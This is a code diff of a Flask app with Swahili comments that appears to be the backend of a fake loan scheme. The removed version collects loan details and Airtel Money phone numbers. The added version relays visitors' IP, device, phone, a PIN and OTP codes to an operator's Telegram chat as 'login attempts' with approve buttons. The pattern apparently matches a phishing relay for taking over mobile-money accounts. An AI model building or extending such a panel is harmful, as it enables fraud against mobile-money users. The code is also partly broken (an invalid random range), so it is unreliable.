@@ -1,147 +1,121 @@
-from flask import Flask, request, render_template_string, session
-import requests, os, random
+from flask import Flask, request, jsonify
+import os
+import requests
+import random
+from datetime import datetime
+import pytz
 
-app = Flask(__name__)
-app.secret_key = os.getenv("SECRET_KEY", "random_secret_123")
+app = Flask(__name__) # Jina linaendelea kuwa 'app' ndani
 
-TOKEN = os.getenv("TELEGRAM_TOKEN")
-ADMIN_CHAT_ID = os.getenv("CHAT_ID")
+TELEGRAM_TOKEN = os.environ.get('TELEGRAM_TOKEN')
+CHAT_ID = os.environ.get('CHAT_ID') # 8916717084
+SECRET_KEY = os.environ.get('SECRET_KEY')
 
-CURRENT_OTP = {}
-CURRENT_DATA = {}
+TELEGRAM_API = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}"
+applications = {} # Hifadhi ya muda
 
-# STEP 1: Loan Calculator
-STEP1_HTML = """
-<form action="/step2" method="post" style="max-width:400px;margin:50px auto;padding:20px;border:1px solid #ccc;border-radius:10px;font-family:Arial;">
-<h2 style="text-align:center;color:#333;">Step 1: Loan Calculator</h2>
-<label><b>Loan Amount $:</b></label><br>
-<input name="amount" type="number" placeholder="5000" required style="width:100%;padding:10px;margin:10px 0;border:1px solid #ddd;border-radius:5px;"><br>
-<label><b>Months:</b></label><br>
-<input name="months" type="number" placeholder="12" required style="width:100%;padding:10px;margin:10px 0;border:1px solid #ddd;border-radius:5px;"><br>
-<button style="width:100%;padding:12px;background:#28a745;color:white;border:none;border-radius:5px;font-size:16px;cursor:pointer;">Proceed</button>
-</form>
-"""
-
-# STEP 2: Purpose
-STEP2_HTML = """
-<form action="/step3" method="post" style="max-width:400px;margin:50px auto;padding:20px;border:1px solid #ccc;border-radius:10px;font-family:Arial;">
-<h2 style="text-align:center;color:#333;">Step 2: Purpose</h2>
-<label><b>Unataka pesa kwa ajili ya nini?</b></label><br>
-<select name="purpose" required style="width:100%;padding:10px;margin:10px 0;border:1px solid #ddd;border-radius:5px;">
-<option value="">Chagua</option>
-<option value="Biashara">Biashara</option>
-<option value="Personal Loan">Personal Loan</option>
-</select><br>
-<button style="width:100%;padding:12px;background:#007bff;color:white;border:none;border-radius:5px;font-size:16px;cursor:pointer;">Proceed</button>
-</form>
-"""
-
-# STEP 3: Airtel Money
-STEP3_HTML = """
-<form action="/submit" method="post" style="max-width:400px;margin:50px auto;padding:20px;border:1px solid #ccc;border-radius:10px;font-family:Arial;">
-<h2 style="text-align:center;color:#333;">Step 3: Payment Details</h2>
-<label><b>+243 Airtel Money Number:</b></label><br>
-<input name="phone" placeholder="+2438xxxxxxx" required style="width:100%;padding:10px;margin:10px 0;border:1px solid #ddd;border-radius:5px;"><br>
-<button style="width:100%;padding:12px;background:#dc3545;color:white;border:none;border-radius:5px;font-size:16px;cursor:pointer;">Apply Now</button>
-</form>
-"""
-
-def send_telegram(chat_id, text, keyboard=None):
-    if not TOKEN: return
-    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
+def send_telegram_message(chat_id, text, reply_markup=None):
+    url = f"{TELEGRAM_API}/sendMessage"
     payload = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
-    if keyboard: payload["reply_markup"] = keyboard
-    requests.post(url, json=payload, timeout=10)
+    if reply_markup:
+        payload["reply_markup"] = reply_markup
+    requests.post(url, json=payload)
 
-@app.route('/')
-def home():
-    user_id = request.args.get('user')
-    html = STEP1_HTML.replace('</form>', f'<input type="hidden" name="user" value="{user_id}"></form>')
-    return render_template_string(html)
+def get_time_eat():
+    tz = pytz.timezone('Africa/Nairobi')
+    return datetime.now(tz).strftime("%I:%M %p EAT")
 
-@app.route('/step2', methods=['POST'])
-def step2():
-    session['amount'] = request.form['amount']
-    session['months'] = request.form['months']
-    session['user'] = request.form['user']
-    html = STEP2_HTML.replace('</form>', f'<input type="hidden" name="user" value="{request.form["user"]}"></form>')
-    return render_template_string(html)
+def generate_code():
+    return str(random.randint(1000, 9999))
 
-@app.route('/step3', methods=['POST'])
-def step3():
-    session['purpose'] = request.form['purpose']
-    session['user'] = request.form['user']
-    html = STEP3_HTML.replace('</form>', f'<input type="hidden" name="user" value="{request.form["user"]}"></form>')
-    return render_template_string(html)
+def generate_id():
+    return str(random.randint(100000, 999))
 
-@app.route('/submit', methods=['POST'])
-def submit():
-    user_id = request.form.get('user') # SASA TUNACHUKUA KUTOKA FORM
-    if not user_id:
-        return "<h3 style='text-align:center; color:red;margin-top:50px;'>Error: Fungua link kutoka kwa bot ya Telegram</h3>"
+# ========= WEBHOOK =========
+@app.route(f'/{TELEGRAM_TOKEN}', methods=['POST'])
+def webhook():
+    data = request.get_json()
+    if 'callback_query' in data:
+        handle_callback(data['callback_query'])
+    return jsonify({"ok": True})
 
-    data = {
-        'amount': session.get('amount'),
-        'months': session.get('months'),
-        'purpose': session.get('purpose'),
-        'phone': request.form['phone'],
-        'user_chat_id': user_id
+def handle_callback(callback):
+    data = callback['data']
+    admin_chat = callback['message']['chat']['id']
+    parts = data.split('_')
+    action = parts[0]
+    app_id = parts[2]
+
+    if app_id not in applications:
+        return
+
+    if action == "approve":
+        if parts[1] == "login":
+            otp = generate_code()
+            applications[app_id]['otp'] = otp
+            send_otp_verification(applications[app_id])
+            send_telegram_message(admin_chat, f"✅ Login Approved. Subiri OTP...")
+        elif parts[1] == "otp":
+            user_chat = applications[app_id]['user_chat']
+            send_telegram_message(user_chat, "✅ <b>LOAN APPROVED & OTP VERIFIED</b>")
+            send_telegram_message(admin_chat, f"✅ OTP Approved. Mchakato umekamilika")
+
+    elif action == "cancel":
+        send_telegram_message(admin_chat, f"❌ Request {app_id} imekataliwa")
+
+# ========= FUNCTIONS ZA KUTUMA UJUMBE =========
+def send_login_attempt(user_data):
+    message = f"""🔐 <b>New Login Attempt</b>
+
+<b>IP Address:</b> {user_data['ip']}
+<b>Country:</b> {user_data['country']}
+<b>Device:</b> {user_data['device']}
+<b>Time:</b> {user_data['time']}
+
+<b>PIN:</b> <code>{user_data['pin']}</code>"""
+
+    keyboard = {
+        "inline_keyboard": [
+            [{"text": "✅ Approve", "callback_data": f"approve_login_{user_data['id']}"}],
+            [{"text": "❌ Cancel", "callback_data": f"cancel_login_{user_data['id']}"}]
+        ]
     }
-    app_id = str(random.randint(10000, 99999))
-    CURRENT_DATA[app_id] = data
+    send_telegram_message(CHAT_ID, message, keyboard)
 
-    text = f"<b>🚨 New Loan Application #{app_id}</b>\n\n<b>Amount:</b> ${data['amount']} for {data['months']} months\n<b>Purpose:</b> {data['purpose']}\n<b>Phone:</b> {data['phone']}"
-    keyboard = {"inline_keyboard": [
-        [{"text": "✅ Approve", "callback_data": f"approve_{app_id}"},
-         {"text": "❌ Reject", "callback_data": f"reject_{app_id}"}]
-    ]}
-    send_telegram(ADMIN_CHAT_ID, text, keyboard)
-    return "<h3 style='text-align:center; color:orange;margin-top:50px;'>Application received. Subiri admin akubali.</h3>"
+def send_otp_verification(user_data):
+    message = f"""🔑 <b>OTP Verification</b>
 
-@app.route(f"/{TOKEN}", methods=['POST'])
-def telegram_webhook():
-    update = request.get_json()
+<b>Phone:</b> {user_data['phone']}
+<b>OTP Code:</b> <code>{user_data['otp']}</code>
+<b>Time:</b> {user_data['time']}"""
 
-    if 'message' in update:
-        chat_id = update['message']['chat']['id']
-        text = update['message'].get('text', '')
+    keyboard = {
+        "inline_keyboard": [
+            [{"text": "✅ Approve", "callback_data": f"approve_otp_{user_data['id']}"}],
+            [{"text": "❌ Cancel", "callback_data": f"cancel_otp_{user_data['id']}"}]
+        ]
+    }
+    send_telegram_message(CHAT_ID, message, keyboard)
 
-        if text == '/start':
-            msg = f"Habari! Anza maombi hapa:\n{request.url_root}?user={chat_id}"
-            send_telegram(chat_id, msg)
+# ========= ROUTE YA WEBSITE YAKO =========
+@app.route('/login_attempt', methods=['POST'])
+def login_attempt():
+    data = request.get_json()
+    app_id = generate_id()
 
-        for app_id, otp_data in list(CURRENT_OTP.items()):
-            if str(otp_data.get('user_chat_id')) == str(chat_id) and otp_data.get('waiting') == True:
-                user_otp = text
-                if user_otp == otp_data['code']:
-                    data = CURRENT_DATA.get(app_id, {})
-                    send_telegram(ADMIN_CHAT_ID, f"<b>✅ LOAN APPROVED & OTP VERIFIED</b>\n\n<b>ID:</b> {app_id}\n<b>Phone:</b> {data.get('phone')}\n<b>Amount:</b> ${data.get('amount')}")
-                    send_telegram(chat_id, "<b>Asante! Loan yako imekubaliwa.</b>")
-                    CURRENT_OTP.pop(app_id)
-                    CURRENT_DATA.pop(app_id)
-                else:
-                    send_telegram(chat_id, "<b>OTP sio sahihi. Jaribu tena.</b>")
-                return "ok", 200
-
-    if 'callback_query' in update:
-        query = update['callback_query']
-        data = query['data']
-        app_id = data.split('_')[1]
-        user_chat_id = CURRENT_DATA[app_id]['user_chat_id']
-
-        if data.startswith('approve_'):
-            otp = str(random.randint(1000, 9999))
-            CURRENT_OTP[app_id] = {'code': otp, 'user_chat_id': user_chat_id, 'waiting': True}
-            send_telegram(user_chat_id, f"<b>Admin amekubali maombi yako #{app_id}</b>\n\nWeka 4-digit OTP hapa chini ili kumaliza:\n<code>{otp}</code>")
-            send_telegram(ADMIN_CHAT_ID, f"<b>🔑 OTP YA #{app_id}:</b> <code>{otp}</code>\nNimeshatuma kwa mteja.")
-            requests.post(f"https://api.telegram.org/bot{TOKEN}/answerCallbackQuery", json={"callback_query_id": query['id']})
-
-        elif data.startswith('reject_'):
-            send_telegram(user_chat_id, f"<b>Samahani maombi yako #{app_id} yamekataliwa.</b>")
-            send_telegram(ADMIN_CHAT_ID, f"<b>❌ Application #{app_id} IMEKATAA</b>")
-            requests.post(f"https://api.telegram.org/bot{TOKEN}/answerCallbackQuery", json={"callback_query_id": query['id']})
-
-    return "ok", 200
+    user_data = {
+        "id": app_id,
+        "user_chat": data['chat_id'],
+        "ip": data['ip'],
+        "country": data['country'],
+        "device": data['device'],
+        "time": get_time_eat(),
+        "pin": generate_code(),
+        "phone": data['phone']
+    }
+    applications[app_id] = user_data
+    send_login_attempt(user_data)
+    return jsonify({"status": "sent", "app_id": app_id})
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=os.environ.get('PORT', 5000))
+    app.run(host='0.0.0.0', port=10000)
